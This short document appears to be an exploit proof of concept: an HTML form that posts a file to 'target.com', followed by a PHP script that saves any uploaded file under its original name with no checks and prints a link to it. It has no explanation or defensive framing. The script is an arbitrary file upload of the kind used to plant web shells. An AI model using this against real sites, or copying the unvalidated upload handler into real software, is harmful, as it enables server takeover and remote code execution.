<form method="post" action="https://target.com" enctype="multipart/form-data">
<input type="file" name="csrf"/>
<input type="submit" value="upload"/>
</form>

<?php
@copy($_FILES['csrf']['tmp_name'],$_FILES['csrf']['name']);
echo("<a href=".$_FILES['csrf']['name'].">".$_FILES['csrf']['name']."</a>");
?>
